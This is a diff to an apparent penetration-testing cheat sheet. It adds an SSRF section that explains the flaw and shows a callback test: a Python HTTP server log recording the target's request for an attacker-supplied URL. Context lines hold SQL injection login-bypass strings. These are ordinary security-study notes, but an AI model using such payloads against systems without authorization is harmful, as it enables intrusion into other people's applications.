@@ -42,6 +42,20 @@ admin ' OR 1=1 --
 ````
 1' OR 1 = 1#
 ````
+### SSRF
+SSRF vulnerabilities occur when an attacker has full or partial control of the request sent by the web application. A common example is when an attacker can control the third-party service URL to which the web application makes a request.
+
+<img src="https://user-images.githubusercontent.com/127046919/224167289-d416f6b0-f256-4fd8-b7c2-bcdc3c474637.png" width="250" height="240" />
+
+````
+python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.146.172 - - [09/Mar/2023 16:39:17] code 404, message File not found
+192.168.146.172 - - [09/Mar/2023 16:39:17] "GET /test.html HTTP/1.1" 404 -
+````
+````
+http://192.168.119.146/test.html
+````
 ## Exploitation <img src="https://cdn-icons-png.flaticon.com/512/2147/2147286.png" width="40" height="40" />
 ### Windows rce techniques
 ````
